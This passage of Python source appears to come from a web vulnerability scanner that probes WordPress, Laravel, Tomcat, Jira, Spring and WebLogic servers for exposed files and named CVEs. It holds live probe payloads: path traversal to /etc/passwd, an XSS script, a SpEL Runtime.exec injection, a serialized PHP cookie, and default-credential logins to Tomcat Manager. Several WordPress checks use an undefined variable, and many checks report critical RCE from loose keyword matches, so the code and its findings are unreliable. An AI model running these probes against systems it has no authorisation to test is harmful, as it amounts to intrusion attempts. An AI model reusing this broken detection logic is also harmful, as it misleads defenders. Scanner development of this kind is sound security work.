    def _check_wp_user_enum(self, base_url: str) -> List[Dict]:
        """WordPress user enumeration via REST API."""
        vulnerabilities = []
        paths = ['/wp-json/wp/v2/users', '/?rest_route=/wp/v2/users']
        for p in paths:
            try:
                url = urljoin(base_url, p)
                resp = self.http_client.get(url, timeout=self.timeout)
                if resp and resp.status_code == 200:
                    if isinstance(resp.text, str) and ('"id"' in resp.text and '"name"' in resp.text):
                        vulnerabilities.append({
                            'type': 'WordPress User Enumeration',
                            'severity': 'medium',
                            'url': url,
                            'evidence': 'WordPress REST API exposes user list with IDs and usernames',
                            'description': 'WordPress REST API exposes registered users without authentication',
                            'remediation': 'Disable WP REST API user endpoints or require authentication',
                        })
                        break
            except Exception as e:
                logger.debug(f"WP user enum error: {e}")
        return vulnerabilities

    def _check_wp_xmlrpc(self, base_url: str) -> List[Dict]:
        """WordPress XML-RPC exposed."""
        path = "/xmlrpc.php"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code in (200, 405, 401):
                body = resp.text.lower()
                if 'xmlrpc' in body or '<?xml' in body or 'faultcode' in body:
                    vulnerabilities.append({
                        'type': 'WordPress XML-RPC Exposed',
                        'severity': 'medium',
                        'url': url,
                        'evidence': 'XML-RPC endpoint accessible - enables brute force and SSRF vectors',
                        'description': 'WordPress XML-RPC exposed allows brute force attacks '
                                       'via system.multicall and SSRF via pingback.ping',
                        'remediation': 'Disable XML-RPC or restrict access via .htaccess',
                    })
        except Exception as e:
            logger.debug(f"WP XML-RPC error: {e}")
        return vulnerabilities

    def _check_wp_debug_log(self, base_url: str) -> List[Dict]:
        """WordPress debug log exposed."""
        path = "/wp-content/debug.log"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200 and len(resp.text) > 100:
                if 'PHP' in resp.text or 'Stack trace' in resp.text or 'WordPress' in resp.text:
                    vulnerabilities.append({
                        'type': 'WordPress Debug Log Exposed',
                        'severity': 'high',
                        'url': url,
                        'evidence': 'WP debug.log accessible - leaks stack traces, errors, and potentially credentials',
                        'description': 'WordPress debug log exposes sensitive debugging information to unauthenticated users',
                        'remediation': 'Disable WP_DEBUG and WP_DEBUG_LOG in wp-config.php, remove debug.log file',
                    })
        except Exception as e:
            logger.debug(f"WP debug log error: {e}")
        return vulnerabilities

    def _check_wp_install(self, base_url: str) -> List[Dict]:
        """WordPress installation page accessible."""
        path = "/wp-admin/install.php"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'wordpress' in resp.text.lower() and 'install' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'WordPress Installation Page Accessible',
                        'severity': 'high',
                        'url': url,
                        'evidence': 'WP installation script available - site may be misconfigured',
                        'description': 'WordPress installation page accessible, may allow site takeover',
                        'remediation': 'Delete or secure wp-admin/install.php after installation',
                    })
        except Exception as e:
            logger.debug(f"WP install error: {e}")
        return vulnerabilities

    def _check_wp_backups(self, base_url: str) -> List[Dict]:
        """WordPress common backup files exposed."""
        backup_paths = [
            '/wp-config.php.bak', '/wp-config.php~', '/wp-config.php.old',
            '/wp-config.php.save', '/wp-config.php.swp', '/wp-config.php.swo',
            '/wp-content/backup-db/', '/wp-content/backups/',
            '/wp-content/uploads/backup/', '/wp-content/uploads/backups/',
            '/backup/backup.sql', '/backups/backup.sql',
            '/wp-content/wp-config.php.bak', '/wp-admin/wp-config.php.bak',
        ]
        vulnerabilities = []
        for bp in backup_paths:
            try:
                url = urljoin(base_url, bp)
                resp = self.http_client.get(url, timeout=self.timeout)
                if resp and resp.status_code == 200 and len(resp.text) > 50:
                    if 'DB_NAME' in resp.text or 'DB_PASSWORD' in resp.text or 'DB_USER' in resp.text:
                        vulnerabilities.append({
                            'type': 'WordPress Backup File Exposure',
                            'severity': 'critical',
                            'url': url,
                            'evidence': f'Backup file exposes database credentials: {bp}',
                            'description': 'WordPress backup file exposes database credentials and sensitive configuration',
                            'remediation': 'Remove backup files, add to .htaccess deny rules, use .gitignore',
                        })
                        break
                    elif 'CREATE TABLE' in resp.text or 'INSERT INTO' in resp.text:
                        vulnerabilities.append({
                            'type': 'Database Backup Exposure',
                            'severity': 'critical',
                            'url': url,
                            'evidence': f'SQL backup file exposed: {bp}',
                            'description': 'SQL database backup accessible to unauthenticated users',
                            'remediation': 'Remove database backups from web-accessible directories',
                        })
                        break
            except Exception as e:
                logger.debug(f"WP backup error: {e}")
        return vulnerabilities

    def _check_cve_2021_29447(self, base_url: str) -> List[Dict]:
        """CVE-2021-29447: WordPress XXE via media upload."""
        vulnerabilities = []
        path = "/wp-json/wp/v2/media"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code in (200, 401, 403):
                if 'wp-json' in resp.text.lower() or 'media' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2021-29447 - WordPress XXE',
                        'severity': 'high',
                        'url': url,
                        'evidence': 'WordPress media endpoint accessible - may be vulnerable to XXE',
                        'cve_references': ['CVE-2021-29447'],
                        'description': 'WordPress XXE vulnerability via WAV audio file upload in media library',
                        'remediation': 'Upgrade WordPress to 5.7.2+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2021-29447 error: {e}")
        return vulnerabilities

    def _check_cve_2020_11738(self, base_url: str) -> List[Dict]:
        """CVE-2020-11738: WordPress Duplicator plugin backup disclosure."""
        vulnerabilities = []
        paths = [
            '/wp-content/backups-dup-lite/',
            '/wp-content/uploads/backups-dup-lite/',
            '/wp-content/backups/',
            '/wp-content/uploads/wp-duplicator/',
        ]
        for p in paths:
            try:
                url = urljoin(base_url, p)
                resp = self.http_client.get(url, timeout=self.timeout)
                if resp and resp.status_code == 200:
                    if '.daf' in resp.text or 'Installer' in resp.text or 'archive' in resp.text.lower():
                        vulnerabilities.append({
                            'type': 'CVE-2020-11738 - Duplicator Backup Disclosure',
                            'severity': 'critical',
                            'url': url,
                            'evidence': 'Duplicator plugin backup archives exposed',
                            'cve_references': ['CVE-2020-11738'],
                            'description': 'WordPress Duplicator plugin exposes full site backups',
                            'remediation': 'Remove backup archives, update Duplicator plugin',
                        })
                        break
            except Exception as e:
                logger.debug(f"CVE-2020-11738 error: {e}")
        return vulnerabilities

    def _check_cve_2017_5486(self, base_url: str) -> List[Dict]:
        """CVE-2017-5486: WordPress user impersonation via REST API."""
        vulnerabilities = []
        path = "/wp-json/wp/v2/users/1"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if '"id"' in resp.text and '"name"' in resp.text and '"slug"' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2017-5486 - WP User Impersonation',
                        'severity': 'medium',
                        'url': url,
                        'evidence': 'User details exposed via REST API without authentication',
                        'cve_references': ['CVE-2017-5486'],
                        'description': 'WordPress user data exposed via REST API enabling targeted attacks',
                        'remediation': 'Upgrade WordPress or restrict REST API access to authenticated users',
                    })
        except Exception as e:
            logger.debug(f"CVE-2017-5486 error: {e}")
        return vulnerabilities

    # =========================================================================
    # Laravel CVEs
    # =========================================================================

    def _check_cve_2021_3129(self, base_url: str) -> List[Dict]:
        """CVE-2021-3129: Laravel Ignition RCE."""
        vulnerabilities = []
        path = "/_ignition/health-check"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'can_execute_commands' in resp.text or 'ignition' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2021-3129 - Laravel Ignition RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'Laravel Ignition debug page accessible - RCE via variable injection',
                        'cve_references': ['CVE-2021-3129'],
                        'description': 'Laravel Ignition RCE via variable injection in solution filter',
                        'remediation': 'Upgrade Laravel to 6.20.12+, 7.30.2+, 8.40.0+, or disable Ignition in production',
                    })
        except Exception as e:
            logger.debug(f"CVE-2021-3129 error: {e}")

        path2 = "/_ignition/execute-solution"
        url2 = urljoin(base_url, path2)
        try:
            resp = self.http_client.post(
                url2,
                json={"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
                      "parameters": {"variableName": "test", "viewFile": ""}},
                headers={'Content-Type': 'application/json'},
                timeout=self.timeout,
            )
            if resp and resp.status_code in (200, 500):
                if 'ignition' in resp.text.lower() or 'error' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2021-3129 - Laravel Ignition RCE (Confirmed)',
                        'severity': 'critical',
                        'url': url2,
                        'evidence': 'Ignition execute-solution endpoint accessible - confirmed RCE vector',
                        'cve_references': ['CVE-2021-3129'],
                        'description': 'Laravel Ignition execute-solution endpoint accessible - confirmed RCE',
                        'remediation': 'Upgrade Laravel or disable Ignition in production',
                    })
        except Exception as e:
            logger.debug(f"CVE-2021-3129 execute-solution error: {e}")
        return vulnerabilities

    def _check_cve_2018_15133(self, base_url: str) -> List[Dict]:
        """CVE-2018-15133: Laravel unserialize RCE."""
        vulnerabilities = []
        path = "/"
        url = urljoin(base_url, path)
        try:
            headers = {
                'X-XSRF-TOKEN': 'O:29:"Illuminate\\Support\\Facades\\Facade":1:{s:8:"dummyKey";s:4:"test";}',
                'Cookie': 'XSRF-TOKEN=O:29:"Illuminate\\Support\\Facades\\Facade":1:{s:8:"dummyKey";s:4:"test";}',
            }
            resp = self.http_client.get(url, headers=headers, timeout=self.timeout)
            if resp and resp.status_code in (500, 400):
                if 'unserialize' in resp.text.lower() or 'Illuminate' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2018-15133 - Laravel Unserialize RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'Laravel unserialize error on crafted XSRF token',
                        'cve_references': ['CVE-2018-15133'],
                        'description': 'Laravel unserialize RCE via XSRF token cookie',
                        'remediation': 'Upgrade Laravel to 5.5.42+, 5.6.30+, upgrade APP_KEY rotation',
                    })
        except Exception as e:
            logger.debug(f"CVE-2018-15133 error: {e}")
        return vulnerabilities

    def _check_cve_2017_16894(self, base_url: str) -> List[Dict]:
        """CVE-2017-16894: Laravel .env config exposure."""
        vulnerabilities = []
        paths = [
            '/.env', '/.env.example', '/app/.env', '/public/.env',
            '/storage/logs/.env', '/bootstrap/.env',
        ]
        for p in paths:
            try:
                url = urljoin(base_url, p)
                resp = self.http_client.get(url, timeout=self.timeout)
                if resp and resp.status_code == 200:
                    body = resp.text
                    if 'DB_HOST' in body or 'DB_PASSWORD' in body or 'APP_KEY' in body or 'APP_ENV' in body:
                        vulnerabilities.append({
                            'type': 'CVE-2017-16894 - Laravel .env Exposure',
                            'severity': 'critical',
                            'url': url,
                            'evidence': f'Laravel environment file exposed: {p}',
                            'cve_references': ['CVE-2017-16894'],
                            'description': 'Laravel .env file exposes database credentials, app key, and other secrets',
                            'remediation': 'Block .env files via web server config, never commit .env to version control',
                        })
                        break
            except Exception as e:
                logger.debug(f"CVE-2017-16894 error: {e}")
        return vulnerabilities

    def _check_laravel_debug(self, base_url: str) -> List[Dict]:
        """Laravel debug mode enabled."""
        vulnerabilities = []
        path = "/debug/phpinfo"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'phpinfo' in resp.text.lower() or 'PHP Version' in resp.text:
                    vulnerabilities.append({
                        'type': 'Laravel Debug Mode Enabled',
                        'severity': 'high',
                        'url': url,
                        'evidence': 'Laravel debug mode enabled - phpinfo accessible',
                        'description': 'Laravel debug mode exposes PHP configuration, environment variables, and stack traces',
                        'remediation': 'Set APP_DEBUG=false in .env for production environment',
                    })
        except Exception as e:
            logger.debug(f"Laravel debug error: {e}")

        path2 = "/config/cached.php"
        url2 = urljoin(base_url, path2)
        try:
            resp = self.http_client.get(url2, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'laravel' in resp.text.lower() or 'app' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'Laravel Config Cache Exposure',
                        'severity': 'high',
                        'url': url2,
                        'evidence': 'Laravel cached config exposes application configuration',
                        'description': 'Laravel cached config file exposed - reveals app configuration',
                        'remediation': 'Block access to config caching endpoints in production',
                    })
        except Exception:
            pass
        return vulnerabilities

    # =========================================================================
    # Apache Tomcat CVEs
    # =========================================================================

    def _check_cve_2019_0232(self, base_url: str) -> List[Dict]:
        """CVE-2019-0232: Apache Tomcat CGI RCE."""
        vulnerabilities = []
        path = "/cgi-bin/cmd.bat"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code in (200, 500, 400):
                if 'tomcat' in resp.text.lower() or 'cgi' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2019-0232 - Tomcat CGI RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'Tomcat CGI Servlet enabled - RCE via crafted CGI requests',
                        'cve_references': ['CVE-2019-0232'],
                        'description': 'Apache Tomcat CGI Servlet RCE via crafted request parameters',
                        'remediation': 'Upgrade Tomcat to 7.0.93+, 8.5.39+, 9.0.17+, or disable CGI Servlet',
                    })
        except Exception as e:
            logger.debug(f"CVE-2019-0232 error: {e}")
        return vulnerabilities

    def _check_cve_2020_9484(self, base_url: str) -> List[Dict]:
        """CVE-2020-9484: Apache Tomcat session persistence RCE."""
        vulnerabilities = []
        path = "/examples/jsp/tsc/tsc.jsp"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                body_lower = resp.text.lower()
                if 'tomcat' in body_lower or 'jakarta' in body_lower:
                    vulnerabilities.append({
                        'type': 'CVE-2020-9484 - Tomcat Session RCE',
                        'severity': 'high',
                        'url': url,
                        'evidence': 'Tomcat server detected - may be vulnerable to session persistence RCE',
                        'cve_references': ['CVE-2020-9484'],
                        'description': 'Apache Tomcat RCE via crafted session file when PersistenceManager is enabled',
                        'remediation': 'Upgrade Tomcat to 7.0.104+, 8.5.55+, 9.0.35+, 10.0.0-M5+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2020-9484 error: {e}")
        return vulnerabilities

    def _check_cve_2021_25329(self, base_url: str) -> List[Dict]:
        """CVE-2021-25329: Apache Tomcat realm info leak."""
        vulnerabilities = []
        path = "/manager/html"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code in (401, 403):
                if 'tomcat' in resp.text.lower() or 'manager' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2021-25329 - Tomcat Manager Info Leak',
                        'severity': 'medium',
                        'url': url,
                        'evidence': 'Tomcat Manager application accessible - may leak realm info',
                        'cve_references': ['CVE-2021-25329'],
                        'description': 'Apache Tomcat Manager application with weak default credentials',
                        'remediation': 'Remove default Tomcat users, restrict manager access',
                    })
        except Exception as e:
            logger.debug(f"CVE-2021-25329 error: {e}")

        # Check Tomcat version disclosure
        path2 = "/"
        url2 = urljoin(base_url, path2)
        try:
            resp = self.http_client.get(url2, timeout=self.timeout)
            if resp and resp.status_code == 200:
                body = resp.text
                if 'Apache Tomcat' in body:
                    import re as _re
                    match = _re.search(r'Apache Tomcat/(\d+\.\d+\.\d+)', body)
                    if match:
                        version = match.group(1)
                        vulnerabilities.append({
                            'type': 'Tomcat Version Disclosure',
                            'severity': 'low',
                            'url': url2,
                            'evidence': f'Tomcat version {version} disclosed in default page',
                            'description': f'Apache Tomcat version {version} exposed - enables targeted CVE discovery',
                            'remediation': 'Remove or customize Tomcat default landing page',
                        })
        except Exception:
            pass
        return vulnerabilities

    def _check_cve_2019_0221(self, base_url: str) -> List[Dict]:
        """CVE-2019-0221: Apache Tomcat SSI RCE."""
        vulnerabilities = []
        path = "/ssi/ssi.shtml"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code in (200, 404, 500):
                if 'tomcat' in resp.text.lower() or 'ssi' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2019-0221 - Tomcat SSI RCE',
                        'severity': 'high',
                        'url': url,
                        'evidence': 'Tomcat SSI Servlet may be enabled',
                        'cve_references': ['CVE-2019-0221'],
                        'description': 'Apache Tomcat SSI (Server-Side Includes) RCE via crafted SSI directives',
                        'remediation': 'Upgrade Tomcat to 7.0.93+, 8.5.39+, 9.0.17+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2019-0221 error: {e}")
        return vulnerabilities

    def _check_cve_2018_11759(self, base_url: str) -> List[Dict]:
        """CVE-2018-11759: Apache Tomcat JK connector access log."""
        vulnerabilities = []
        path = "/jkstatus"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code in (200, 401, 403):
                body_lower = resp.text.lower()
                if 'jkstatus' in body_lower or 'jk_' in body_lower or 'mod_jk' in body_lower:
                    vulnerabilities.append({
                        'type': 'CVE-2018-11759 - Tomcat JK Connector',
                        'severity': 'high',
                        'url': url,
                        'evidence': 'JK Status manager accessible - may leak internal routing info',
                        'cve_references': ['CVE-2018-11759'],
                        'description': 'Apache Tomcat JK mod_jk status manager exposes internal routing information',
                        'remediation': 'Restrict access to /jkstatus, upgrade mod_jk',
                    })
        except Exception as e:
            logger.debug(f"CVE-2018-11759 error: {e}")
        return vulnerabilities

    def _check_tomcat_manager(self, base_url: str) -> List[Dict]:
        """Apache Tomcat Manager default credentials."""
        vulnerabilities = []
        manager_paths = ['/manager/html', '/manager/', '/host-manager/', '/manager/status']
        for mp in manager_paths:
            try:
                url = urljoin(base_url, mp)
                resp = self.http_client.get(url, timeout=self.timeout)
                if resp and resp.status_code in (401, 403, 200):
                    body_lower = resp.text.lower()
                    if 'tomcat' in body_lower or 'manager' in body_lower:
                        vulnerabilities.append({
                            'type': 'Tomcat Manager Application Exposed',
                            'severity': 'high',
                            'url': url,
                            'evidence': f'Tomcat manager endpoint accessible at {mp}',
                            'description': 'Apache Tomcat Manager application exposed - try default credentials (admin/admin, tomcat/tomcat)',
                            'remediation': 'Remove default users, restrict manager access to localhost',
                        })
                        break
            except Exception as e:
                logger.debug(f"Tomcat manager error: {e}")

        # Try default creds
        import base64 as _b64
        creds = [b'tomcat:tomcat', b'admin:admin', b'admin:tomcat', b'admin:', b'tomcat:admin']
        for mp in ['/manager/html']:
            try:
                url = urljoin(base_url, mp)
                for cred in creds:
                    encoded = _b64.b64encode(cred).decode()
                    headers = {'Authorization': f'Basic {encoded}'}
                    resp = self.http_client.get(url, headers=headers, timeout=self.timeout)
                    if resp and resp.status_code == 200:
                        vulnerabilities.append({
                            'type': 'Tomcat Manager Default Credentials',
                            'severity': 'critical',
                            'url': url,
                            'evidence': f'Tomcat Manager accessible with default credentials: {cred.decode()}',
                            'description': 'Apache Tomcat Manager accessible with default credentials - full server control',
                            'remediation': 'Change all default Tomcat passwords immediately',
                        })
                        break
            except Exception as e:
                logger.debug(f"Tomcat creds error: {e}")
        return vulnerabilities

    def _check_cve_2018_8037(self, base_url: str) -> List[Dict]:
        """CVE-2018-8037: Apache Tomcat session fixation."""
        vulnerabilities = []
        path = "/examples/jsp/tsc/tsc.jsp"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                body_lower = resp.text.lower()
                if 'tomcat' in body_lower or 'jakarta' in body_lower:
                    vulnerabilities.append({
                        'type': 'CVE-2018-8037 - Tomcat Session Fixation',
                        'severity': 'medium',
                        'url': url,
                        'evidence': 'Tomcat detected - may allow session fixation via JSESSIONID re-use',
                        'cve_references': ['CVE-2018-8037'],
                        'description': 'Apache Tomcat session fixation via crafted JSESSIONID',
                        'remediation': 'Upgrade Tomcat to 7.0.90+, 8.5.33+, 9.0.11+, or use SSL',
                    })
        except Exception as e:
            logger.debug(f"CVE-2018-8037 error: {e}")
        return vulnerabilities

    # =========================================================================
    # More Jira CVEs
    # =========================================================================

    def _check_cve_2020_14178(self, base_url: str) -> List[Dict]:
        """CVE-2020-14178: Jira path traversal via project keys."""
        vulnerabilities = []
        path = "/browse/test?project=&summary=../../etc/passwd"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp:
                if 'root:x:0:0' in resp.text or 'atlassian' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2020-14178 - Jira Path Traversal',
                        'severity': 'high',
                        'url': url,
                        'evidence': 'Jira project key path traversal endpoint accessible',
                        'cve_references': ['CVE-2020-14178'],
                        'description': 'Jira Server/Data Center path traversal via project key browse endpoint',
                        'remediation': 'Upgrade Jira to 7.13.6+, 8.5.1+, 8.6.0+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2020-14178 error: {e}")
        return vulnerabilities

    def _check_cve_2021_26065(self, base_url: str) -> List[Dict]:
        """CVE-2021-26065: Jira XSS via project configuration."""
        vulnerabilities = []
        paths = [
            '/secure/ConfigurePortalPages!default.jspa?view=test<script>alert(1)</script>',
            '/secure/ConfigurePortalPages!default.jspa?view=test',
        ]
        for p in paths:
            try:
                url = urljoin(base_url, p)
                resp = self.http_client.get(url, timeout=self.timeout)
                if resp and resp.status_code == 200:
                    if '<script>alert(1)</script>' in resp.text:
                        vulnerabilities.append({
                            'type': 'CVE-2021-26065 - Jira XSS',
                            'severity': 'medium',
                            'url': url,
                            'evidence': 'Jira reflected XSS via view parameter',
                            'cve_references': ['CVE-2021-26065'],
                            'description': 'Jira Server/Data Center XSS via portal pages configuration',
                            'remediation': 'Upgrade Jira to 8.5.11+, 8.13.3+, 8.14.0+',
                        })
                        break
            except Exception as e:
                logger.debug(f"CVE-2021-26065 error: {e}")
        return vulnerabilities

    def _check_cve_2022_0540(self, base_url: str) -> List[Dict]:
        """CVE-2022-0540: Jira authentication bypass."""
        vulnerabilities = []
        path = "/secure/Dashboard.jspa"
        url = urljoin(base_url, path)
        try:
            headers = {'X-Atlassian-Token': 'no-check'}
            resp = self.http_client.get(url, headers=headers, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'dashboard' in resp.text.lower() or 'atlassian' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2022-0540 - Jira Auth Bypass',
                        'severity': 'high',
                        'url': url,
                        'evidence': 'Jira dashboard accessible with X-Atlassian-Token bypass header',
                        'cve_references': ['CVE-2022-0540'],
                        'description': 'Jira Server/Data Center authentication bypass via X-Atlassian-Token header',
                        'remediation': 'Upgrade Jira to 8.13.18+, 8.20.6+, 8.22.0+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2022-0540 error: {e}")

        # Also check if Jira is present
        path2 = "/secure/QuickSearch.jspa?quickSearch=true"
        url2 = urljoin(base_url, path2)
        try:
            resp = self.http_client.get(url2, timeout=self.timeout)
            if resp and resp.status_code in (200, 302, 401):
                if 'atlassian' in resp.text.lower() or 'jira' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'Jira Instance Detected',
                        'severity': 'info',
                        'url': url2,
                        'evidence': 'Jira instance detected on target',
                        'description': 'Atlassian Jira instance detected - check for additional vulnerabilities',
                        'remediation': 'Keep Jira updated with latest security patches',
                    })
        except Exception:
            pass
        return vulnerabilities

    def _check_cve_2022_26135(self, base_url: str) -> List[Dict]:
        """CVE-2022-26135: Jira SSRF via mobile plugin."""
        vulnerabilities = []
        path = "/plugins/servlet/mobile/config"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code in (200, 302):
                if 'mobile' in resp.text.lower() or 'atlassian' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2022-26135 - Jira SSRF Mobile',
                        'severity': 'high',
                        'url': url,
                        'evidence': 'Jira mobile plugin endpoint accessible - SSRF vector',
                        'cve_references': ['CVE-2022-26135'],
                        'description': 'Jira Server/Data Center SSRF via mobile plugin',
                        'remediation': 'Upgrade Jira to 8.13.22+, 8.20.10+, 8.22.4+, 9.4.0+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2022-26135 error: {e}")
        return vulnerabilities

    # =========================================================================
    # More Spring CVEs
    # =========================================================================

    def _check_cve_2018_1273(self, url: str) -> List[Dict]:
        """CVE-2018-1273: Spring Data Commons RCE."""
        vulnerabilities = []
        try:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            path = "/users/search/test"
            test_url = urljoin(base, path)
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            data = "name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('test')]=test"
            resp = self.http_client.post(test_url, data=data, headers=headers, timeout=self.timeout)
            if resp and resp.status_code in (500, 400):
                if 'java.lang' in resp.text or 'Spring' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2018-1273 - Spring Data Commons RCE',
                        'severity': 'critical',
                        'url': test_url,
                        'evidence': 'Spring Data endpoint reflects SpEL evaluation',
                        'cve_references': ['CVE-2018-1273'],
                        'description': 'Spring Data Commons RCE via SpEL injection',
                        'remediation': 'Upgrade Spring Data Commons to 2.0.5+ or 1.13.11+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2018-1273 error: {e}")
        return vulnerabilities

    def _check_cve_2016_4977(self, url: str) -> List[Dict]:
        """CVE-2016-4977: Spring Security OAuth2 RCE."""
        vulnerabilities = []
        try:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            path = "/oauth/authorize?response_type=token&client_id=test&redirect_uri=${233*233}"
            test_url = urljoin(base, path)
            resp = self.http_client.get(test_url, timeout=self.timeout)
            if resp and '54289' in resp.text:
                vulnerabilities.append({
                    'type': 'CVE-2016-4977 - Spring Security OAuth2 RCE',
                    'severity': 'critical',
                    'url': test_url,
                    'evidence': 'SpEL ${233*233} evaluates to 54289 in OAuth redirect_uri',
                    'cve_references': ['CVE-2016-4977'],
                    'description': 'Spring Security OAuth2 RCE via SpEL injection in redirect_uri',
                    'remediation': 'Upgrade Spring Security OAuth to 2.0.12+ or 2.1.0+',
                })
        except Exception as e:
            logger.debug(f"CVE-2016-4977 error: {e}")
        return vulnerabilities

    def _check_cve_2017_4971(self, url: str) -> List[Dict]:
        """CVE-2017-4971: Spring WebFlow OGNL RCE."""
        vulnerabilities = []
        try:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            path = "/login"
            test_url = urljoin(base, path)
            data = "_eventId_=test&_(233*233)=test"
            resp = self.http_client.post(test_url, data=data,
                                         headers={'Content-Type': 'application/x-www-form-urlencoded'},
                                         timeout=self.timeout)
            if resp and '54289' in resp.text:
                vulnerabilities.append({
                    'type': 'CVE-2017-4971 - Spring WebFlow OGNL RCE',
                    'severity': 'critical',
                    'url': test_url,
                    'evidence': 'OGNL expression _(233*233) evaluates to 54289',
                    'cve_references': ['CVE-2017-4971'],
                    'description': 'Spring WebFlow OGNL RCE via crafted request parameter',
                    'remediation': 'Upgrade Spring WebFlow to 2.4.5+',
                })
        except Exception as e:
            logger.debug(f"CVE-2017-4971 error: {e}")
        return vulnerabilities

    def _check_cve_2016_1000027(self, base_url: str) -> List[Dict]:
        """CVE-2016-1000027: Spring HTTP Invoker RCE."""
        vulnerabilities = []
        paths = [
            '/httpinvoker',
            '/remoting/RemoteInvocation',
            '/remoting/httpinvoker',
        ]
        for p in paths:
            try:
                url = urljoin(base_url, p)
                resp = self.http_client.get(url, timeout=self.timeout)
                if resp and resp.status_code != 404:
                    body = resp.text[:200].lower()
                    if 'remoting' in body or 'invoker' in body or 'httpinvoker' in body:
                        vulnerabilities.append({
                            'type': 'CVE-2016-1000027 - Spring HTTP Invoker',
                            'severity': 'critical',
                            'url': url,
                            'evidence': 'Spring HTTP Invoker endpoint accessible - deserialization RCE vector',
                            'cve_references': ['CVE-2016-1000027'],
                            'description': 'Spring HTTP Invoker deserialization RCE',
                            'remediation': 'Remove Spring HTTP Invoker or upgrade to Spring 5.3.x+',
                        })
                        break
            except Exception as e:
                logger.debug(f"CVE-2016-1000027 error: {e}")
        return vulnerabilities

    # =========================================================================
    # More Oracle WebLogic CVEs
    # =========================================================================

    def _check_cve_2020_14750(self, base_url: str) -> List[Dict]:
        """CVE-2020-14750: Oracle WebLogic Console RCE."""
        vulnerabilities = []
        path = "/console/images/%252E%252E%252Fconsole.portal"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'console' in resp.text.lower() or 'WebLogic' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2020-14750 - WebLogic Console RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'WebLogic console accessible via path traversal bypass',
                        'cve_references': ['CVE-2020-14750'],
                        'description': 'Oracle WebLogic Server console authentication bypass RCE',
                        'remediation': 'Apply Oracle Critical Patch Update October 2020',
                    })
        except Exception as e:
            logger.debug(f"CVE-2020-14750 error: {e}")
        return vulnerabilities

    def _check_cve_2020_14645(self, base_url: str) -> List[Dict]:
        """CVE-2020-14645: Oracle WebLogic Coherence RCE."""
        vulnerabilities = []
        path = "/console/console.portal"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code in (200, 302, 401):
                if 'weblogic' in resp.text.lower() or 'console' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2020-14645 - WebLogic Coherence RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'WebLogic console detected - Coherence deserialization vector',
                        'cve_references': ['CVE-2020-14645'],
                        'description': 'Oracle WebLogic Coherence deserialization RCE',
                        'remediation': 'Apply Oracle Critical Patch Update July 2020',
                    })
        except Exception as e:
            logger.debug(f"CVE-2020-14645 error: {e}")
